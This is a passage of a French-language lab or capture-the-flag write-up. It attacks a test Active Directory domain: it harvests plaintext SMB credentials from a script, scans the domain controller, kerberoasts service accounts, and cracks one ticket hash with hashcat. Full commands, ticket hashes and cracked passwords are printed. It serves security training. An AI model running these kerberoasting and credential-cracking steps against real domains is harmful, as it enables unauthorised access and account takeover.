Une fois connecté en tant que hermes, on identifie un groupe étrange `smbscores`

```bash
hermes@OlympeWordpress:/$ id
uid=1011(hermes) gid=1011(hermes) groupes=1011(hermes),1013(smbscores)
hermes@OlympeWordpress:/$ groups
hermes smbscores
hermes@OlympeWordpress:/$
```

Ainsi on peut voit qu’il n’y a qu’un seul autre utilisateur nommé dans ce groupe et que ce dernier permet de lire 2 fichier, `scores.txt` et `score_update.sh`

```bash
find / -group smbscores 2>/dev/null
/opt/scores/score_update.sh
/srv/pantheon.god
/srv/pantheon.god/scores
/srv/pantheon.god/scores/scores.txt
hermes@OlympeWordpress:/$ 
```

Bien qu'il n'y ait rien dans le fichier `scores.txt` il y a tout de même des credentials dans le fichier `score_update.sh`. Cette fonctionnalité permet d'update les scores des jeux censés bientôt commencer et les envoyer vers un serveur sur l'ip `192.168.56.11`.

```
hermes@OlympeWordpress:/$ cat /srv/pantheon.god/scores/scores.txt
hermes@OlympeWordpress:/$ cat /opt/scores/score_update.sh
smbclient //192.168.56.11/scores -U 'smbscores%Sc0r3sS3rv1c3!2025' -c 'put /srv/pantheon.god/scores/scores.txt scores.txt'
hermes@OlympeWordpress:/$
```

…

- nmap
    
    ```
    nmapfull 192.168.56.11
    Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-22 23:43 CEST
    Nmap scan report for 192.168.56.11
    Host is up (0.0015s latency).
    
    PORT      STATE SERVICE            VERSION
    22/tcp    open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
    53/tcp    open  domain             Simple DNS Plus
    88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-06-22 21:30:05Z)
    135/tcp   open  msrpc              Microsoft Windows RPC
    139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:pantheon-dc01.pantheon.god
    | Not valid before: 2025-06-21T19:24:38
    |_Not valid after:  2026-06-21T19:24:38
    |_ssl-date: TLS randomness does not represent time
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap           Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:pantheon-dc01.pantheon.god
    | Not valid before: 2025-06-21T19:24:38
    |_Not valid after:  2026-06-21T19:24:38
    3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:pantheon-dc01.pantheon.god
    | Not valid before: 2025-06-21T19:24:38
    |_Not valid after:  2026-06-21T19:24:38
    |_ssl-date: TLS randomness does not represent time
    3269/tcp  open  ssl/ldap           Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:pantheon-dc01.pantheon.god
    | Not valid before: 2025-06-21T19:24:38
    |_Not valid after:  2026-06-21T19:24:38
    |_ssl-date: TLS randomness does not represent time
    3389/tcp  open  ssl/ms-wbt-server?
    | rdp-ntlm-info:
    |   Target_Name: PANTHEON
    |   NetBIOS_Domain_Name: PANTHEON
    |   NetBIOS_Computer_Name: PANTHEON-DC01
    |   DNS_Domain_Name: pantheon.god
    |   DNS_Computer_Name: pantheon-dc01.pantheon.god
    |   DNS_Tree_Name: pantheon.god
    |   Product_Version: 10.0.26100
    |_  System_Time: 2025-06-22T21:31:56+00:00
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
    | Not valid before: 2025-06-20T19:19:22
    |_Not valid after:  2025-12-20T19:19:22
    5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf             .NET Message Framing
    47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  msrpc              Microsoft Windows RPC
    49665/tcp open  msrpc              Microsoft Windows RPC
    49666/tcp open  msrpc              Microsoft Windows RPC
    49667/tcp open  msrpc              Microsoft Windows RPC
    49668/tcp open  msrpc              Microsoft Windows RPC
    49670/tcp open  msrpc              Microsoft Windows RPC
    49672/tcp open  msrpc              Microsoft Windows RPC
    49682/tcp open  msrpc              Microsoft Windows RPC
    49683/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
    49687/tcp open  msrpc              Microsoft Windows RPC
    49698/tcp open  msrpc              Microsoft Windows RPC
    51019/tcp open  msrpc              Microsoft Windows RPC
    56277/tcp open  msrpc              Microsoft Windows RPC
    56321/tcp open  msrpc              Microsoft Windows RPC
    MAC Address: 08:00:27:BA:71:77 (Oracle VirtualBox virtual NIC)
    Service Info: Host: PANTHEON-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -13m20s, deviation: 0s, median: -13m20s
    | smb2-security-mode:
    |   311:
    |_    Message signing enabled and required
    |_nbstat: NetBIOS name: PANTHEON-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 080027ba7177 (Oracle VirtualBox virtual NIC)
    | smb2-time:
    |   date: 2025-06-22T21:31:56
    |_  start_date: N/A
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 102.80 seconds
    ```
    

On voit avec `netexec` que l'on a affaire à un domain contrôleur.

Ainsi on oublie pas rajouter les information du domaine dans /etc/hosts et /etc/krb5.conf. Et pour ce faire on peut utiliser `netexec`

```
[smbscores@pantheon.god][Jun 22, 2025 - 23:48:03 (CEST)] exegol-pantheon_wu writeup # nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-hosts /etc/hosts
SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
[smbscores@pantheon.god][Jun 22, 2025 - 23:48:07 (CEST)] exegol-pantheon_wu writeup # nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5 /etc/krb5.conf
SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
```

On peut tenter des attaques classiques de l'active directory tel que l'`asreprosting` ou  `kerberoasting` qui justement nécessitent des identifiants valides pour être exécutées.
Cela nous permet de récupérer 3 utilisateur `kerberoastable`, notre utilisateur courant `smbscores`  dont on connais déjà le mots de pass, le service `svc_thunderB$`, et le service hercule qui semble être au vue du nom, un compte utilisateur fessant office de compte de service, donc potentiellement un utilisateur avec un mots de pass faible et `bruteforçable`. 

D’ailleurs on peut voir que `svc_thunderB$` est un `gmsa` que seul les utilisateur membre du groupe `OLYMPE-SERVICES-MANAGERS` peuvent obtenir le mots de passe.

```
nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --gmsa
LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:Enforced) (channel binding:When Supported)
LDAP        192.168.56.11   389    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Getting GMSA Passwords
LDAP        192.168.56.11   389    PANTHEON-DC01    Account: svc_thunderB$        NTLM: <no read permissions>       PrincipalsAllowedToReadPassword: OLYMPE-SERVICES-MANAGERS
```

- Pour effectuer une attaque `kerberoasting` on doit ce synchronise avec le DC puis on peux utiliser `netexec` pour effectuer l’attaque.
    
    ```
    faketime "$(rdate -n $IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
    ```
    
    ```
    [smbscores@pantheon.god][Jun 22, 2025 - 23:40:10 (CEST)] exegol-pantheon_wu writeup # nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoast Kerberoastables.txt --port 636
    LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god)
    LDAPS       192.168.56.11   636    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2025
    LDAPS       192.168.56.11   636    PANTHEON-DC01    Bypassing disabled account krbtgt
    LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Total of records returned 16
    LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: svc_thunderB$ memberOf:  pwdLastSet: 2025-06-21 21:33:28.483382 lastLogon:<never>
    LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$18$svc_thunderB$$PANTHEON.GOD$*pantheon.god/svc_thunderB$*$b892c7289757c281b495c1d7$5cd2a3bbb76b2eab9d2db9cbc0997bb02f12f309e133bb9661fa357eac918ef779a6371854a144d48c9c3edb72aae30e35e910141732061000b9d8ef8d453c6efd4f3ae169226f988794530c4d65e9dc821a69c2d8a0b2e05524a37d02cdc89f089f766009d39f6e1a029cc71d70427aaf98e21bdb445a41181e8159879c70671f31490ef4c01b8ae2d4631f156de52947c43474465b5bb2e2e1657991ba5570b0f75f25af78d1c6ca7a48d6427873669fad6df1665f2bbaffbf4fded6c7c3cd6b1d900d5768fb0f6ff1f7f78c5137fc1aa92ce963902cf9a44aeab17537715cea58f3903c9b663b62fa121dcbbf2e44d93a6b1b01d061ad575c3372a4e7951b0182f8112c8342073bac6de95ece585d18b909b9dff856766d35ce7748d8242d624da53a4a6a8c4223492949ea439d3e049c234c4e4612575b6c47fa530742fc563cfa9b39e770916a47e3d5e031c26bf46284f55f2bbaa30a3b29b3462d91cba0f0e8717ce9a1a55d09ace6c44ab5f37b50cf88d700776dcbaef2d15cb44075d8fc5260b25538a63b9f13b118592f81c6c0b6afdd03b1b0e7f9b0e1a9f3a72d813a14ae9088e65dedad8ebda78125dba743cca9494c5e886144f399e66a786428b3087b3a7902f9475f3e9851ce97ddad708fa8c528286051cbe2f239700329252c620247a3873e2d89dd2f0f26319f011be542161a373088aee9a404fc9d0e0523f59364956210e84ecc4b813fb7a252a1a88240c5e0df3b8d2eff05c06d159556b7190f1ea09169872482a0d1624b5db340c522c76ae59e379833fd939bd0375ffbf5e1e83daed3dae32bffc8a563244dc7157d5a1897a74c5448070214c718f7fc746c97e9a83fc507afcb7e8e92af2441e9dc63ee1541734284e88b7e55821b6bd128229272ab35eee90d6e05480aae455a3812060a223119f91656d163154d3db35e6f64fe2625409b56b580effc9f816e2baeea05a5c2da6e5566dd7f63045c38fe954b8c4d812046d79d7ee1611091fa2174f72a25e24786877ed423e39ea7b9fbb3e1ff49d5f7650734b9c0fce605c2734e55ba5aaea0928f7ff497d9f1c36d6c5387112adaf8a5213604d01d92071b5fe72b7945fa85ab41c054af19e1f116c55349009b35877447a0b921489b66f9e01283ca5f4cb576f1e7a38cde0707d6c5384228c4edec36904e393fcd0b3ffa969818f1063e0bb800a33d3d96380a28e254b30bd5f0d465fd65548164e20d6ec6a22359dc79a1d80fb3a8993835376ea690cdba410b94cc198c2966ac8a6212eb93256ad7148ec22377452a0f9ea02fec233c5a7977fe4a01be5bcd4e0043934ed822e0d5c19c5ac3806e85c7659b35d957990458c9a075f16f4158b605bf1319a5f2f3d7289dcbe224659fa49e04a7c6d30d81a03056134946f8dcac47da2a330ca2361db6892c8297bb47be2b61974f23e5caadbad16a128ab60e28e45d715f3c4740da3e3cad59f62c2d81ce13b4050c926949c81db1006188bb35378bb70e90d74117099fe26617
    LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: hercule memberOf: CN=OLYMPE-IMORTAL-HEROS,OU=OLYMPIENS,DC=pantheon,DC=god pwdLastSet: 2025-06-21 21:37:10.735902 lastLogon:<never>
    LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$23$*hercule$PANTHEON.GOD$pantheon.god/hercule*$aa9ccd3d56303ff1475981267ff6a9b8$2f7bcb43d4d4587dbc1c625599553784d26a2347a5bd7a9f056b7e7d2b9f6d31bb93173e824ebcffed3e6b01103eb5a8e9827bd8455a373a50faa5fe0fd21725a0f2ae080a8e4c3fbaccfb41fc642f74e8238ff9b646718bcd59411926f2a6442a2d539440b0599f4fd3c7fb797332c7e09de70ada10af736cb837abc595a65cbe561b7fcc8c41aa2b2329af3eac8e5085e260d4c06fe622497a01383580801fb7152b3b90a04854b88dfe88a6ac472402c192b71c6b4b5bb5586ff655e4b54e713bb08ecb77dd50edd93f3a919df5ad700c54f20cb2647ef9f2fb997dd6627fcbd8c62b37e0da4cd4cb06d676ea48ad6628e3f52ef401e793b7b2049a2c8b068da21d377c8b41fa42aa22f37281f19c3aa4a45b26242669d32425f05b565e9f2a581ee45ca275101cb87fedb909a1c240480cfb8f0cb2d59ae4615ecb7ec30d6ca307a56d48ef022fa16f3b2e4abf4bf89060df5bc940ad1dff7f5d5419cd30c910360f830a493f6150f4651cd1b5a986f09b479c540ed1e0bcd86293e02e456181d2f59ec19a01f0396f3c56c72d75ee5a3d0394509bebc34f78f17c2f59a265eed0942bb08327b5d0074d7631e3bd13b5371e40b23ccf8f59ceb7a6ea2bd2f88673362442e62155452b19d3b88ee6c55a3970e73dd47c44f6b025bf4db0a226302d85f01403b2ea8ac0e5f04a94e0ab8a3de141342e3e62c8111ac6bacbb199970549916f814a1ddbad28c8e59deb989c7f22ddf207334a3e655ead0284a504c3ddfd5eca1491a1c10b0d1b60eaa1e2a4dddbec8ffa3262326091406e486682f3b46b0389ec7b42a7ee80c08552c83b9df8d7e72da16d8381bd65fcfe4a60e2a5214877573af59064d894b03236941ac851cb13ad54d2bbe6fd3220cf63f61cc14dfbbee922ded7613d373ca1f58912babadaaae4788fcdb5bf5c8109dd6695301bad72dec1364187ee2759b7743ed7340e960cdfe832dca8c12f055e970348704dfe6df3857c46132b126b44dd7b2c0e21452fdf6f88dba351ab4cc27f08eace50ed6e1eb564b61fddefa2f014ed6c76769078846726e3f596fc60269dc44f0038c575fac8ff5877583f1bb2463e3f4978c19396a4ca54c54896d0ceaf841d9354dbb3ae117816c51804d95fa2f4ede4c60d3a372b90cace99b26fbe92624da58676e68b4e15e4ed5e73178b73bb726f44609a60afbd6c461c6489d7119b9fc8babebb85285d0c75c05250cfd218fcafe07a2754e076b67033d3f4f32ebead3e97332569b48a2e0ccbaee31e5913d1886c2fc2e8982386feabdcaeb0f6b51273830ecd6cb85fbe0bcd237dbddebf029335fc24d90ccaa2faf86c7eb2981e2588039f3b5534ba1c48505fcabbd5678c1f8664f517f39c0de8ac3ed00f696ccecf01b36914a0c0bea2f804c540b0c8e460b16c7c7c9e16ccc365d788b2f59daff3abe406a9deea327424146091cda71d83327b5192113f5f644576b126121a5424a1a6da0e62de340f23f5c1e5631c876b578b6b02da43e3ad408e7124
    LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: smbscores memberOf:  pwdLastSet: 2025-06-21 21:37:03.510375 lastLogon:<never>
    LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$23$*smbscores$PANTHEON.GOD$pantheon.god/smbscores*$42bf39b969a8a888cc5b4b1fd4eb5cbd$e1850ad13e806adb8eb0cd6c6126bc2989c933eec4196d03812955970261ae096ec04b57e624b63d25eb69447345389b3208834f6421fd9009c34faa7f44e1f350083214e26dba82ff6b6773f7e648b9bac14fec93e26b561f2b4e961bf2d2e767b36da98e236a54ff7887c729e6cf26d5f0bc02a66ea6cd84c38dc2be93b0f2628186de5cca2b576f3c14d680032409d7c900b17262419ef2def0f6830487f19e4a5ae8cf6c3a4e2aaf896be48fa0e861ee59722a4599a34cd6d90071c5e47eb4349b6b16b19adb1990cafaee0df4b7363344479eba87af5e375771ace74fb1c5a979acbf5d107a55399bc4db96099a7d16482b1c550eaf704e7b9aaa9b319289da58e93e09c4a7a4582e648b4ddd02c59f98f53c5d2a672ef9c56abbbb2bac86902c9dd4bf8b5a3fa6c4180320c5a7fc5c0f45ee254964a3cb3d01d236784470bed8135c3c563809ca8510707790284b04b3ec6022d60a1c6f1910b4cb5da5ccdd109bd29fb0cc2f8a64db642d9cef0fed1915f43d80d2460ff20da29a1a2b9d355b713c3d3fd3beaaffeef0d3c9c23e8583e0aa4e04c31a769a2810f2edf98335f1b3cdcba422db5af41f8df99e56b1bd57dd7ea9b72c39edd7443ff8dda448ac6a119e26ec25fa50a3f1cf68206abd6dc447327faf993f78b922e69492d519ffda58655fcdbda660ced01cd5e49f83c541b251bc481f373164b355ca933a023639062daae4d9db6b14fb85c32afff3240d8358ece0ab8122737e5cb7b1bff3cf2ecb20684f78317078a5cfb602388908c2f0476e7f90114cc38d06addc9d897a43171c29a1b9bd8ddbbe2b8a8c12e7162aee168c402ec9cac65891ba8d2e3ff06036bae1eb532fba13fd0766b038c77bb1a3d1c130ade476142cb7a74acf2d73d2a9a28c6541aed0a3cb79df3f4c6342fb784cbc502c969b5f6c571a0c2388895977844cc46fc5c1b724b8ed596abe6711e47d6d37e48196b6dc42bf1af4e8c18c5c66a6cf41adf6e3f7c0ec2e5de7a8c6e396575e65459f66ef2e7437acd2de10a892c2611ebfc111d53c2a973a7930b6f12811532ecc4ccacd32c3bd5bad72c4ca75b947984bdd808c9a1ccfec1ddcea94dde2e338901801f3077f3bcc42d4bb4c75d30a4d21661a5e67d820241eef439dfbcf324df0747c000bc823ab91cd9e5edd78fcfaf585150a2bfadbe3535e3698c224cdab7f2cfefedf399d02359a990193b9d97907d95f223e425b59491e97c5129c7d002c4ed8e8ca63e591cf3c01109b72c49b25de0c7657935586cfec4fb75f13eba9a693db0c3f4b98388c72122a782198107a4e6d61365607f5c9b2f91b8a6f19316ed956fe952e597cc594cec8559afa9cb1431d14bd900a6a3e83e3234b434bdcd51b2862a69e7937fbda7aa70632df4c74f64c9348a2bfa7f126026a9e9a21bcc3513a7123abf3c8cdfd9739101bba3a4bf52d7c78922a6003ab7d5578aac44f1336ec1d81c34bff9c70f68f7932be19a65d5cf00b96286885a1017658f674a981d53ebb1e1e
    [smbscores@pantheon.god][Jun 22, 2025 - 23:40:12 (CEST)] exegol-pantheon_wu writeup #
    ```
    
- On trouve effectivement que hercule est le seul utilisateur dont le `mdp` à pus être retrouver avec `hashcat`
    
    ```
    smbscores@pantheon.god][Jun 22, 2025 - 23:45:50 (CEST)] exegol-pantheon_wu scan # hashcat --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
    hashcat (v6.2.6) starting
    ....
    
    $krb5tgs$23$*hercule$PANTHEON.GOD$pantheon.god/hercule*$aa9ccd3d56303ff1475981267ff6a9b8$2f7bcb43d4d4587dbc1c625599553784d26a2347a5bd7a9f056b7e7d2b9f6d31bb93173e824ebcffed3e6b01103eb5a8e9827bd8455a373a50faa5fe0fd21725a0f2ae080a8e4c3fbaccfb41fc642f74e8238ff9b646718bcd59411926f2a6442a2d539440b0599f4fd3c7fb797332c7e09de70ada10af736cb837abc595a65cbe561b7fcc8c41aa2b2329af3eac8e5085e260d4c06fe622497a01383580801fb7152b3b90a04854b88dfe88a6ac472402c192b71c6b4b5bb5586ff655e4b54e713bb08ecb77dd50edd93f3a919df5ad700c54f20cb2647ef9f2fb997dd6627fcbd8c62b37e0da4cd4cb06d676ea48ad6628e3f52ef401e793b7b2049a2c8b068da21d377c8b41fa42aa22f37281f19c3aa4a45b26242669d32425f05b565e9f2a581ee45ca275101cb87fedb909a1c240480cfb8f0cb2d59ae4615ecb7ec30d6ca307a56d48ef022fa16f3b2e4abf4bf89060df5bc940ad1dff7f5d5419cd30c910360f830a493f6150f4651cd1b5a986f09b479c540ed1e0bcd86293e02e456181d2f59ec19a01f0396f3c56c72d75ee5a3d0394509bebc34f78f17c2f59a265eed0942bb08327b5d0074d7631e3bd13b5371e40b23ccf8f59ceb7a6ea2bd2f88673362442e62155452b19d3b88ee6c55a3970e73dd47c44f6b025bf4db0a226302d85f01403b2ea8ac0e5f04a94e0ab8a3de141342e3e62c8111ac6bacbb199970549916f814a1ddbad28c8e59deb989c7f22ddf207334a3e655ead0284a504c3ddfd5eca1491a1c10b0d1b60eaa1e2a4dddbec8ffa3262326091406e486682f3b46b0389ec7b42a7ee80c08552c83b9df8d7e72da16d8381bd65fcfe4a60e2a5214877573af59064d894b03236941ac851cb13ad54d2bbe6fd3220cf63f61cc14dfbbee922ded7613d373ca1f58912babadaaae4788fcdb5bf5c8109dd6695301bad72dec1364187ee2759b7743ed7340e960cdfe832dca8c12f055e970348704dfe6df3857c46132b126b44dd7b2c0e21452fdf6f88dba351ab4cc27f08eace50ed6e1eb564b61fddefa2f014ed6c76769078846726e3f596fc60269dc44f0038c575fac8ff5877583f1bb2463e3f4978c19396a4ca54c54896d0ceaf841d9354dbb3ae117816c51804d95fa2f4ede4c60d3a372b90cace99b26fbe92624da58676e68b4e15e4ed5e73178b73bb726f44609a60afbd6c461c6489d7119b9fc8babebb85285d0c75c05250cfd218fcafe07a2754e076b67033d3f4f32ebead3e97332569b48a2e0ccbaee31e5913d1886c2fc2e8982386feabdcaeb0f6b51273830ecd6cb85fbe0bcd237dbddebf029335fc24d90ccaa2faf86c7eb2981e2588039f3b5534ba1c48505fcabbd5678c1f8664f517f39c0de8ac3ed00f696ccecf01b36914a0c0bea2f804c540b0c8e460b16c7c7c9e16ccc365d788b2f59daff3abe406a9deea327424146091cda71d83327b5192113f5f644576b126121a5424a1a6da0e62de340f23f5c1e5631c876b578b6b02da43e3ad408e7124:Worksucks!
    ....
    Stopped: Sun Jun 22 23:46:18 2025
    ```
    

